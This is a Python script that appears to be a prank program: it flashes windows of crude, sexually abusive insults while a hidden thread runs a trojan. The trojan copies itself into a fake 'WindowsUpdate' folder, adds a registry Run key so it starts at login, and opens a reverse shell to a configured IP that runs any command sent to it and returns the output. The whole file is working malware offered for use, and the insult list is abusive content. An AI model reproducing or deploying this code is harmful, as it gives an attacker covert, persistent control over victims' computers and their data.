import tkinter as tk
import random
import threading
import time
import os
import shutil
import subprocess
import socket
import sys
from pathlib import Path

# ==================== CONFIG ====================
YOUR_IP = '192.168.4.123'   # Your IP
PORT = 4444                 # Your port

# ==================== 100 INSULTS ====================
insults = [
    "bro your pp small as fuck", "your mom still calls me daddy", "touch grass you fucking loser",
    "your dad left for a reason lmao", "ratio + your dad left", "skill issue + L + fatherless",
    "you're the reason condoms have expiry dates", "your birth certificate is an apology letter from the condom factory",
    "even your hand rejects you", "bro you look like a rejected Among Us character", "your mom uses your face as a speed bump",
    "you built like a soggy cardboard box", "your dad pulled out but the disappointment stayed", "bro your forehead bigger than your future",
    "you have negative rizz", "even your shower doesn't wanna see you naked", "your mom should've swallowed",
    "you look like you smell like expired milk", "bro your hairline is running faster than your dad did", "you're what happens when God gives up",
    "even your toaster has more game than you", "bro you got rejected by a fleshlight", "your mom calls me when she's lonely",
    "you look like a failed science experiment", "your personality is drier than your mom's pussy", "bro you're the human equivalent of decaf coffee",
    "even your mirror says 'not today'", "you have the sexual appeal of a parking ticket", "your dad left to get milk and never came back... smart man",
    "bro you got negative aura", "your mom uses your pics to scare away raccoons", "you built like a question mark",
    "even your own dick ghosts you", "bro your life is a loading screen that never ends", "you look like you fuck microwaves",
    "your mom should've aborted you but even you were a disappointment", "bro your vibe is 'homeless but make it fashion'",
    "you have the rizz of a soggy sock", "even your Fortnite account is embarrassed of you", "your mom calls you her biggest mistake",
    "bro you look like a melted candle", "you're the reason birth control exists", "your dad left 18 years ago and you're still crying about it",
    "you look like you eat crayons for breakfast", "even your anime waifu rejected you", "bro your face looks like it was designed in MS Paint",
    "your mom uses your face as birth control", "you built like a stale baguette", "even your shadow left you",
    "bro you have 0 bitches and 0 aura", "your existence is a war crime", "you look like you smell like wet dog and broken dreams",
    "even Satan said 'nah I'm good'", "bro your mom uses you as a contraceptive", "you're what happens when two ugly people have a baby",
    "your dad saw your ultrasound and immediately left", "you look like a poorly drawn stick figure", "even your own mom says you're adopted",
    "bro your life is just one long L", "you have the sex appeal of expired yogurt", "your mom regrets not using a coat hanger",
    "you're the human version of a participation trophy", "bro you look like you fuck pillows", "your hairline is in witness protection",
    "even your therapist needs therapy after seeing you", "you built like a question mark having a stroke", "bro your mom calls me instead of you",
    "your existence is a glitch in the matrix", "you look like you were born from a wet fart", "even your left nut wants nothing to do with you",
    "your mom uses your baby pictures as pest control", "bro you're built like a damp sock", "your dad left because he saw your face",
    "you have the rizz of a depressed raccoon", "even your calculator says you're a failure", "bro your mom should've just used the pill",
    "you look like a rejected Roblox character", "your personality is drier than the Sahara", "even your search history is embarrassed of you",
    "you built like a deflated balloon", "bro your forehead needs its own zip code", "your mom uses your face to kill boners",
    "you're the reason God doesn't talk to us anymore", "even your own reflection avoids eye contact", "you look like you jerk off to feet pics",
    "bro your dad left to become a successful man", "your existence is an insult to evolution", "even your sperm said 'fuck this' and left"
]

# ==================== PERSISTENCE ====================
def install_persistence():
    try:
        appdata = os.getenv('APPDATA')
        hidden_folder = Path(appdata) / "WindowsUpdate"
        hidden_folder.mkdir(exist_ok=True)
        
        target_path = hidden_folder / "update_service.exe"
        
        if not target_path.exists():
            current = sys.executable if getattr(sys, 'frozen', False) else __file__
            shutil.copy2(current, target_path)
            
            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "{target_path}" /f'
            subprocess.call(reg_command, shell=True)
    except:
        pass

# ==================== BIGGER WINDOW ====================
def spam_window():
    for _ in range(12):
        root = tk.Tk()
        root.title("lol")
        root.geometry("680x260")           
        root.configure(bg='black')
        
        label = tk.Label(
            root, 
            text=random.choice(insults), 
            font=("Arial", 17, "bold"), 
            fg="red", 
            bg="black",
            wraplength=640,                
            justify="center"
        )
        label.pack(expand=True, padx=25, pady=35)
        
        root.after(2200, root.destroy)     
        root.mainloop()
        time.sleep(0.7)

# ==================== BACKDOOR ====================
def backdoor():
    install_persistence()
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((YOUR_IP, PORT))
            s.sendall(b"connected|" + os.getenv('COMPUTERNAME').encode())
            
            while True:
                cmd = s.recv(4096).decode('utf-8', errors='ignore').strip()
                if not cmd or cmd.lower() == 'exit':
                    break
                try:
                    result = subprocess.getoutput(cmd)
                    s.sendall((result + "\nEND_OF_COMMAND").encode('utf-8'))
                except:
                    s.sendall(b"Command failed\nEND_OF_COMMAND")
        except:
            time.sleep(10)

# ==================== MAIN ====================
if __name__ == "__main__":
    threading.Thread(target=backdoor, daemon=True).start()
    spam_window()